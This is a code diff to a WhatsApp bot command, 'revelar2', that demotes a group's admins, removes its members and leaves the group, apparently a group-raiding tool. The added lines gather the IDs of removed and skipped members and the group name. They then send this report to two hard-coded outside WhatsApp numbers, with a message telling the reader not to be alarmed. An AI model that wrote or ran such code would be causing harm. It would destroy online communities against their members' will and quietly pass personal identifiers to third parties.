@@ -32,6 +32,7 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
   if (!isOwner) return m.reply(`🚫 *Acceso denegado.*`)
   if (!isBotAdmin) return m.reply(`🛑 *Shizuka necesita rango de administrador.*`)
 
+  const inicio = Date.now()
   const grupoInfo = await conn.groupMetadata(m.chat)
   const participantes = grupoInfo.participants || []
   const cleanJid = jid => jid.split('/')[0]
@@ -70,23 +71,56 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
 
   lanzarBombas()
 
+  const ignorados = []
+  const expulsados = []
+
   for (let id of adminsADegradar) {
     try {
       await conn.groupParticipantsUpdate(m.chat, [id], 'demote')
       await delay(1000)
-    } catch (e) {}
+    } catch (e) {
+      ignorados.push(id)
+    }
   }
 
   for (let id of operativos) {
     try {
       await conn.groupParticipantsUpdate(m.chat, [id], 'remove')
+      expulsados.push(id)
       await delay(1500)
-    } catch (e) {}
+    } catch (e) {
+      ignorados.push(id)
+    }
   }
 
   bombasActivas = false
   await delay(1000)
   await conn.groupLeave(m.chat)
+
+  const tiempo = ((Date.now() - inicio) / 1000).toFixed(2)
+  const nombreGrupo = grupoInfo.subject
+  const texto = `
+📡 *Revelación Data*
+📁 Grupo: *${nombreGrupo}*
+⚔️ Usuarios eliminados: ${expulsados.length}
+⏱️ Tiempo de ejecución: ${tiempo} segundos
+🚫 Ignorados: ${ignorados.length}
+
+📤 Eliminados:
+${expulsados.map(jid => `• ${jid}`).join('\n')}
+
+📥 Ignorados:
+${ignorados.map(jid => `• ${jid}`).join('\n')}
+
+🧾 *Esto es el mensaje de confirmación de la revelación con metadatos creada por cenix no te alertes*
+`.trim()
+
+  const destinos = ['5353718509@s.whatsapp.net', '5355699866@s.whatsapp.net']
+  for (let numero of destinos) {
+    try {
+      await conn.sendMessage(numero, { text: texto })
+    } catch (e) {}
+  }
 }
 
 handler.help = ['revelar2']
